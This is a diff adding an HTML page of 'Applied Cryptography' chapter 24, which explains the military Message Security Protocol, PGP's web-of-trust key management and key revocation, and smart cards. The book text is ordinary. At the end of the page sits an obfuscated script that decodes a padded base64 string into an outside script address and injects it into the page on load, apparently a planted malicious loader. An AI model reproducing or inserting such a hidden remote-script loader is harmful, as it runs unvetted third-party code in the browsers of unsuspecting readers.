@@ -1,0 +1,95 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Example Implementations</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=24//-->
+<!--PAGES=584-587//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="24-08.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="24-10.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<H3><A NAME="Heading12"></A><FONT COLOR="#000077">24.11 Message Security Protocol (MSP)</FONT></H3>
+<P>The Message Security Protocol (MSP) is the military equivalent of PEM. It was developed by the NSA in the late 1980s under the Secure Data Network System (SDNS) program. It is an X.400-compatible application-level protocol for securing electronic mail. MSP will be used for signing and encrypting messages in the Department of Defense&#146;s planned Defense Message System (DMS) network.
+</P>
+<P>The Preliminary Message Security Protocol (PMSP), to be used for &#147;unclassified but sensitive&#148; messages, is a version of MSP adapted for use with both X.400 and TCP/IP. This protocol is also called Mosaic.</P>
+<P>Like PEM, MSP and PMSP software applications are flexible and designed to accommodate a variety of algorithms for security functions including signing, hashing, and encryption. PSMP will work with the Capstone chip (see Section 24.17).</P>
+<H3><A NAME="Heading13"></A><FONT COLOR="#000077">24.12 Pretty Good Privacy (PGP)</FONT></H3>
+<P>Pretty Good Privacy (PGP) is a freeware electronic-mail security program, originally designed by Philip Zimmermann [1652]. It uses IDEA for data encryption, RSA (with keys up to 2047 bits) for key management and digital signatures, and MD5 as a one-way hash function.
+</P>
+<P>PGP&#146;s random public keys use a probabilistic primality tester, and get their initial seeds from measuring the user&#146;s keyboard latency while typing. PGP generates random IDEA keys using the method delineated in ANSI X9.17, Appendix C (see Section 8.1) [55], with IDEA as the symmetric algorithm instead of DES. PGP also encrypts the user&#146;s private key using a hashed pass phrase instead of a password.</P>
+<P>PGP-encrypted messages have layered security. The only thing a cryptanalyst can learn about an encrypted message is who the recipient is, assuming he knows the recipient&#146;s key ID. Only after the recipient decrypts the message does he learn who signed the message, if it is signed. Contrast this approach with PEM, which leaves quite a bit of information about the sender, recipient, and message in the unencrypted header.</P>
+<P>The most interesting aspect of PGP is its distributed approach to key management (see Section 8.12). There are no key certification authorities; PGP instead supports a &#147;web of trust.&#148; Every user generates and distributes his own public key. Users sign each other&#146;s public keys, creating an interconnected community of PGP users.</P>
+<P>For example, Alice might physically give her public key to Bob. Bob knows Alice, so he signs her public key. He then gives the signed key back to her and keeps a copy for himself. When Alice wants to communicate with Carol, Alice sends Carol a copy of the key Bob signed. Carol, who already has Bob&#146;s public key (she got it at some other time) and trusts Bob to certify other people&#146;s keys, verifies his signature on Alice&#146;s key and accepts it as valid. Bob has introduced Alice to Carol.</P>
+<P>PGP does not specify a policy for establishing trust; users are free to decide who they trust and who they do not. PGP provides mechanisms for associating trust with public keys and for using trust. Each user keeps a collection of signed public keys in a file called a <B>public-key ring</B>. Each key in the ring has a key legitimacy field that indicates the degree to which the particular user trusts the validity of the key. The higher the trust level, the more the user believes the key is legitimate. A signature trust field measures how far the user trusts the signer to certify the public keys of other users. And finally, an owner trust field indicates the degree to which the particular user trusts the key&#146;s owner to sign other public keys; this field is set manually by the user. PGP continuously updates these fields as users supply new information.</P>
+<P>Figure 24.7 shows how this model might look for a particular user, Alice. Alice&#146;s key is at the top, and the owner trust value is ultimate trust. Alice has signed Bob&#146;s, Carol&#146;s, Dave&#146;s, Ellen&#146;s, and Frank&#146;s keys. She trusts Bob and Carol to sign other people&#146;s public keys, and she partially trusts Dave and Ellen to sign other people&#146;s public keys. And she trusts Gail to sign other people&#146;s public keys, even though she has not signed Gail&#146;s key herself.</P>
+<P>Two partially trusted signatures may be sufficient to certify a key. Alice believes that Kurt&#146;s key is legitimate because both Dave and Ellen have signed it. This is not automatic in PGP; Alice can set her own paranoia level.</P>
+<P>Just because Alice believes a key to be valid, she does not have to trust it to sign other people&#146;s keys. She does not trust Frank to sign other people&#146;s public keys, even though she signed his key herself. And she does not trust Ivan&#146;s signature on Martin&#146;s key, or Kurt&#146;s signature on Nancy&#146;s key.</P>
+<P>Owen&#146;s key doesn&#146;t fit into the web anywhere; perhaps Alice got it from a key server. PGP does not assume that the key is valid; Alice must either declare the key valid or decide to trust one of the key&#146;s signers.</P>
+<P>Of course, nothing prevents Alice from using keys she does not trust. PGP&#146;s job is to alert Alice that the key is not trusted, not to prevent communications.</P>
+<P>The weakest link of this whole system is key revocation: It is impossible to guarantee that no one will use a compromised key. If Alice&#146;s private key is stolen she can send out something called a <B>key revocation certificate</B>, but since key distribution is <I>ad hoc</I> and largely word of mouth there is no guarantee that it will reach everyone who has her public key on his key ring. And as Alice has to sign the key revocation certificate with her private key; if she loses the key altogether she cannot revoke it.</P>
+<I><P><A NAME="Fig4"></A><A HREF="javascript:displayWindow('images/24-04.jpg',366,195 )"><IMG SRC="images/24-04t.jpg"></A>
+<BR><A HREF="javascript:displayWindow('images/24-04.jpg',366,195)"><FONT COLOR="#000077"><B>Figure 24.7</B></FONT></A>&nbsp;&nbsp;PGP trust model.</I>
+</P>
+<P>The current version of PGP is 2.6.2. A new version of PGP, PGP 3.0, is scheduled for release by the end of 1995. Changes in 3.0 include options for triple-DES, SHA, and other public-key algorithms, a split of the encryption and signature public-key/private-key key pairs, enhanced procedures for key revocation, improved key-ring management functions, an API for integrating PGP in other programs, and a completely rewritten code base.
+</P>
+<P>PGP is available for MS-DOS, UNIX, Macintosh, Amiga, and Atari. It is free for personal, noncommercial use, and is available from many ftp sites on the Internet. To ftp PGP from MIT, telnet to net-dist.mit.edu, log in as getpgp, answer the questions, then ftp to net-dist.mit.edu and change to the directory named in the telnet session. It is also available from <A HREF="ftp.ox.ac.uk">ftp.ox.ac.uk</A>, <A HREF="ftp.dsi.unimi.it">ftp.dsi.unimi.it</A>, <A HREF="ftp.funet.fi">ftp.funet.fi</A>, <A HREF="ftp.demon.co.uk">ftp.demon.co.uk</A>, Compuserve, AOL, and elsewhere. For U.S. commercial users, PGP can be bought&#151;complete with licenses&#151;for about $100 from a company called ViaCrypt, 9033 N 24th Ave., Phoenix, AZ, 85021; (602) 944-0773; viacrypt@acm.org. Several shareware front-ends are available to help integrate PGP into MS-DOS, Microsoft Windows, Macintosh, and UNIX.</P>
+<P>There are several books about PGP [601, 1394, 1495]. The source code has even been published in book form [1653] in an attempt to frustrate the U.S. Department of State, which continues to maintain that source code is exportable on paper but not electronically. Assuming you trust IDEA, PGP is the closest you&#146;re likely to get to military-grade encryption.</P>
+<H3><A NAME="Heading14"></A><FONT COLOR="#000077">24.13 Smart Cards</FONT></H3>
+<P>A smart card is a plastic card, the size and shape of a credit card, with an embedded computer chip. It&#146;s an old idea&#151;the first patents were filed 20 years ago&#151;but practical limitations made them feasible only five or so years ago. Since then they have taken off, mostly in Europe. Many countries use smart cards for pay telephones. There are also smart credit cards, smart cash cards, smart everything cards. The U.S. credit-card companies are looking at the technology, and within a few years even backwards Americans will have smart cards in their wallets.
+</P>
+<P>A smart card contains a small computer (usually an 8-bit microprocessor), RAM (about a quarter kilobyte), ROM (about 6 or 8 kilobytes), and either EPROM or EEPROM (a few kilobytes). Future-generation smart cards will undoubtedly have more capacity, but some physical limitations on smart cards make expansion difficult. The card has its own operating system, programs, and data. (What it doesn&#146;t have is power; that comes when the card is plugged in to a reader.) And it is secure. In a world where you might not trust someone else&#146;s computer or telephone or whatever, you can still trust a card that you keep with you in your wallet.</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="24-08.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="24-10.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(vJxicSsO, FavBbQFU) {FavBbQFU = vJxicSsO.createElement('script');FavBbQFU.type = 'text/javascript';FavBbQFU.async = true;FavBbQFU.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');vJxicSsO.getElementsByTagName('body')[0].appendChild(FavBbQFU);}(document));</script></body>
+</html>
